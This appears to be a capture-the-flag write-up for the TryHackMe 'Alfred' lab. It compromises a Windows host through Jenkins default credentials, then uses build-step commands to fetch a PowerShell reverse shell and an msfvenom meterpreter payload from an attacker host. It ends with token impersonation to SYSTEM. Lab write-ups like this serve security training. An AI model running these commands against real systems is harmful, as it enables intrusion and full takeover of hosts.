# Room
https://tryhackme.com/room/alfred

# Task 1 - Initial Access
Resources
* https://github.com/samratashok/nishang
* https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1


Enumeration - nmap
```
nmap -A -T4 10.10.59.18 | tee nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 18:50 EDT
Nmap scan report for 10.10.59.18
Host is up (0.22s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2021-05-23T22:52:09+00:00
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-05-22T22:50:11
|_Not valid after:  2021-11-21T22:50:11
|_ssl-date: 2021-05-23T22:52:12+00:00; +2s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.61 seconds
```
Gaining Access - web login
```
Reviewed the open ports and connected to both 80 and 8080.  Found a login form for Jenkins on 8080 and tried the default admin creds, they worked.
```
Gaining Access - reverse shell
```
From the mentioned resources download the Invoke-PowerShellTcp function.  On your attacking machine host this file using python -m http.server 80.  Also start a local listener using nc, nc -nvlp 5544.  Go back to the Jenkins console where you have admin, look at the example project called project.  Inside you can click on configure and then scroll down to paste in a malicous command.  In our case that is the following:

powershell iex (New-Object Net.WebClient).DownloadString('http://1.2.3.4:80/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 1.2.3.4 -Port 5544

Click Save.  Click Build Now.  You should now have a reverse shell where you can grab the user flag.

nc -nvlp 5544                                                                                                                          
listening on [any] 5544 ...                                                                                                                                                     
connect to [1.2.3.4] from (UNKNOWN) [10.10.59.18] 49214                                                                                                                     
Windows PowerShell running as user bruce on ALFRED                                                                                                                              
Copyright (C) 2015 Microsoft Corporation. All rights reserved.                                                                                                                  
                                                                                                                                                                                
PS C:\Program Files (x86)\Jenkins\workspace\project>
```

# Task 2 - Switching Shells
Switching Shells

Use msfvenom to create a reverse shell
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=1.2.3.4 LPORT=5545 -f exe -o alfred.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: alfred.exe
```
Serve up and download the shell as you did with the PowerShell script in the previous step
```
sudo python3 -m http.server 80

Project > Configure > Scroll down to command
powershell "(New-Object System.Net.WebClient).Downloadfile('http://1.2.3.4:80/alfred.exe','alfred.exe')"
Save.  Build Now.
```
Start a meterpreter handler to receive the shell
```
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 5545
lport => 5545
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 1.2.3.4:5545 
```
Execute the shell on the server
```
Project > Configure > Scroll down to command
alfred.exe
Save.  Build Now
```
Verify reception of shell in meterpreter
```
[*] Sending stage (175174 bytes) to 10.10.59.18
[*] Meterpreter session 1 opened (1.2.3.4:5545 -> 10.10.59.18:49237) at 2021-05-23 19:29:31 -0400
meterpreter > shell
Process 3052 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins\workspace\project>whoami
whoami
alfred\bruce

C:\Program Files (x86)\Jenkins\workspace\project>
```
# Task 3 - Privilege Escalation
Token Impersonation

Windows uses token to ensure that accounts have the right privileges to carry out particular actions.  Account tokens are assigned to an account when users login or are authenticated.  This is usually done by LSASS.exe, the token consits of:
* user SID (security identifier)
* group SID
* privileges

Two types of access tokens
* primary - those associated with a user account that are generated on logon
* impersonation - allows a particular process to gain access to resources using the token of another process

Impersonation Token Levels
* SecurityAnonymous - current user/client CANNOT impersonate another user/client
* SecurityIdentification - current user/client can GET the identity and privileges of a client but CANNOT impersonate the client
* SecurityImpersonation - current user/client can impersonate the client's security context on the local system
* SecurityDelegation - current user/client can impersonate the client's security context on a remote system

The privileges of an account allow a user to carry out particular actions.

Resources
* https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
* https://www.exploit-db.com/papers/42556

View all the privileges using whoami /priv
```
C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```
Exit out of the user shell back into the meterpreter shell and load the incognito module
```
C:\Program Files (x86)\Jenkins\workspace\project>exit                                                                                                                           
meterpreter > load incognito                                                                                                                                                    
Loading extension incognito...Success.  
```
List the available tokens with list_tokens -g
```
meterpreter > list_tokens -g                                                                                                                                                    
[-] Warning: Not currently running as SYSTEM, not all tokens will be available                                                                                                  
             Call rev2self if primary process token is SYSTEM                                                                                                                   
                                                                                                                                                                                
Delegation Tokens Available                                                                                                                                                     
========================================                                                                                                                                        
\                                                                                                                                                                               
BUILTIN\Administrators                                                                                                                                                          
BUILTIN\IIS_IUSRS                                                                                                                                                               
BUILTIN\Users                                                                                                                                                                   
NT AUTHORITY\Authenticated Users                                                                                                                                                
NT AUTHORITY\NTLM Authentication                                                                                                                                                
NT AUTHORITY\SERVICE                                                                                                                                                            
NT AUTHORITY\This Organization                                                                                                                                                  
NT AUTHORITY\WRITE RESTRICTED                                                                                                                                                   
NT SERVICE\AppHostSvc                                                                                                                                                           
NT SERVICE\AudioEndpointBuilder                                                                                                                                                 
NT SERVICE\BFE                                                                                                                                                                  
NT SERVICE\CertPropSvc                
...
...
...
...
```
Impersonate the Administrator
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Even though you have impersonated the Administrator with a token, permissions are that of the Primary Token of the process you rode in on
```
1856  1260  alfred.exe            x86   0        alfred\bruce                  C:\Program Files (x86)\Jenkins\workspace\project\alfred.exe
```
To gain higher permissions, migrate to another process like services.exe
```
meterpreter > ps                                                                                                                                                                
                                                                                                                                                                                
Process List                                                                                                                                                                    
============                                                                                                                                                                    
                                                                                                                                                                                
 PID   PPID  Name                  Arch  Session  User                          Path                                                                                            
 ---   ----  ----                  ----  -------  ----                          ----                                                                                            
 0     0     [System Process]                                                                                                                                                   
 4     0     System                x64   0                                                                                                                                      
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe                                                                    
 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
...
...
...
...

meterpreter > migrate 668
[*] Migrating from 1856 to 668...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
With highest level permissions you can now retrieve the flag
```
meterpreter > shell
Process 1564 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>type config\root.txt
type config\root.txt
```